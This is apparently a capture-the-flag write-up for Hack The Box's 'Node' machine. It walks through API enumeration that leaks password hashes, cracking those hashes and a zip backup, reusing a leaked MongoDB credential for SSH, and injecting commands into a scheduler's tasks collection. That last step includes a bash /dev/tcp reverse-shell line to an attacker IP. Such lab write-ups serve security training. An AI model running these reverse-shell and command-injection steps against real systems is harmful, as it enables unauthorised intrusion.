---
title: HTB-Node
draft: false
tags:
  - htb
  - linux
  - javascript
  - API
  - mongodb
  - controllers
  - zip2john
  - medium
---
## Information Gathering
### Nmap

Nmap finds port **22** and **3000** open on server:

`sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.58`

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 10:58 EDT
Nmap scan report for 10.10.10.58
Host is up (0.31s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 15.64 seconds
```

## Enumeration
### HTTP - TCP 3000

The site looks like a social media site:


![](https://i.imgur.com/4azESiL.png)


`/login` path leads to login portal:

![](https://i.imgur.com/fyrIVIB.png)


Each user's profile is accessible through `/profile/<username>`:

![](https://i.imgur.com/NbYzcRG.png)


#### Directory Bruteforce

Directory bruteforcing is not able here because it all the attempts just redirects to home directory so everything is recognized as status code **200**:


`sudo feroxbuster -u http://10.10.10.58:3000 -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![](https://i.imgur.com/oYVf3HS.png)




#### SQLi

SQLmap identified login portal to be not vulnerable:

`sqlmap -r login-req.txt --dbs --batch`

![](https://i.imgur.com/X8wzjG0.png)


## API Misconfiguration

In the Firefox dev tools, I can see the different JS files running on the client:

![](https://i.imgur.com/NhLx8U7.png)


**app.js** was defining different routes for the website and each route had a different controller located in `/controllers` route:

![](https://i.imgur.com/ZM1gX2F.png)


**admin.js** had two end points: `/api/admin/backup` and `/api/session`:

![](https://i.imgur.com/CCcTQsy.png)


**home.js** had one end point: `api/users/latest`

![](https://i.imgur.com/84rBbsd.png)


Both of `/api/admin/backup` and `/api/session` endpoints returned **{"authenticated":false}** when I tried to query them directly. However, `/api/users/latest` show hash password for users **tom**, **mark**, and **rastating** (Unfortunately, none of them were admin users):

![](https://i.imgur.com/VysqhJa.png)


After spending some time, I discovered one more user(**myP14ceAdm1nAcc0uNT**)'s password hash from `/api/users` who is an admin user:

![](https://i.imgur.com/BnNjbNH.png)


## SSH as mark
### Hash Cracking

Using **crackstation**, I can crack three passwords out of four, leaving out **rastating**'s password only:

- myP14ceAdm1nAcc0uNT:manchester
- tom:spongebob
- mark:snowflake

![](https://i.imgur.com/wdsbSpo.png)


### Backup

Using **myP14ceAdm1nAcc0uNT**'s credentials found above, I can now sign-in and download **Backup**:

![](https://i.imgur.com/96dbWX4.png)


**myplace.backup** is a long ASCII text:

![](https://i.imgur.com/eEUcWiK.png)


I will **base64** decrypt it since it seems to be base64 encrypted:

![](https://i.imgur.com/JFytB40.png)


With it decrypted, it seems like a zip file:

![](https://i.imgur.com/xk5Y6xH.png)

Unfortunately, unzipping is requiring a password:

![](https://i.imgur.com/Ryy9d09.png)


I will use **zip2john** to change the zip file to john crackable format:

![](https://i.imgur.com/8zruWHS.png)


Now I crack the password using john, which is **magicword**:

`john --wordlist=/usr/share/wordlists/rockyou.txt zip.hashes`

![](https://i.imgur.com/HiQG9h0.png)



Unzipping the file, now I have backup files of the myplace website:

![](https://i.imgur.com/sYTolij.png)


After spending some time trying to understand how backup is made of, **app.js** shows password and a username for **mongodb** connection:

![](https://i.imgur.com/o2oJXPS.png)


Luckily, user **mark** is reusing it's password for SSH:

`ssh mark@10.10.10.58`

![](https://i.imgur.com/gwNtuIA.png)


## Privesc: mark to tom

There is three users on home directory:

![](https://i.imgur.com/00SAXqi.png)


As expected from earlier **app.js**, there is **mongodb** running locally on port **27017**:

`netstat -ano`

![](https://i.imgur.com/7KrFXa5.png)



### MongoDB

Using the command below, I can sign-in to **mongodb**:

`mongo "mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=SCRAM-SHA-1&authSource=myplace"`

![](https://i.imgur.com/aKUGbrE.png)


`show collection` command shows earlier password hashes and usernames seen earlier:

![](https://i.imgur.com/LfwUMVu.png)


Nothing much was found from mongodb, so I moved on to manual system enumeration.

### Local Enumeration

Listing processes running on system, I see there are two processes being ran as user **tom**:

`ps auxww`

![](https://i.imgur.com/R8t0NFe.png)




`/var/scheduler/app.js` is something I didn't saw before:

```javascript
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

This is what **app.js** is doing above:

It imports necessary modules: child_process for executing shell commands (exec), MongoClient for interacting with MongoDB, ObjectID for creating MongoDB ObjectIDs, and sets up the MongoDB connection URL.

1. It establishes a connection to the MongoDB database specified in the url.

2. Inside the connection callback function, it sets up an interval function that runs every 30 seconds.

3. Within the interval function, it queries the tasks collection in the MongoDB database for documents and converts the result to an array of documents.

4. It iterates over each document retrieved from the tasks collection. For each document:

5. It logs a message indicating the task is being executed.

6. It executes the command specified in the cmd field of the document using exec.

7. It deletes the executed task from the tasks collection using deleteOne.


### Reverse Shell

The vulnerability arises from the fact that the script executes shell commands (doc.cmd) without proper input validation or sanitization.

**Command Injection**: If an attacker gains access to the MongoDB database and can insert or modify documents in the tasks collection, they can potentially execute arbitrary shell commands on the system where the Node.js script is running.

**Privilege Escalation**: Since the script executes commands using the exec function from the child_process module, the commands will run with the same privileges as the user running the Node.js application. If the application is running with elevated privileges (e.g., as root), this could lead to privilege escalation.

I first sign-in to mongodb and list collection -> there is tasks collection:

`mongo -u mark -p 5AYRft73VtFpc84k scheduler` & `show collections`

![](https://i.imgur.com/SmGnJSZ.png)


I will see if I can create file inside of it using the commands below and It is confirmed that file can be created:

`db.tasks.insert({"cmd": "touch /tmp/jadu"})` & `db.tasks.find()`

![](https://i.imgur.com/mvYCXut.png)


Now I can spawn a reverse shell using the command below:

`db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.12/1337 0>&1'"})`

![](https://i.imgur.com/shzCxcG.png)


On my local listener, I have a shell as user **tom**:

![](https://i.imgur.com/agf8fT0.png)

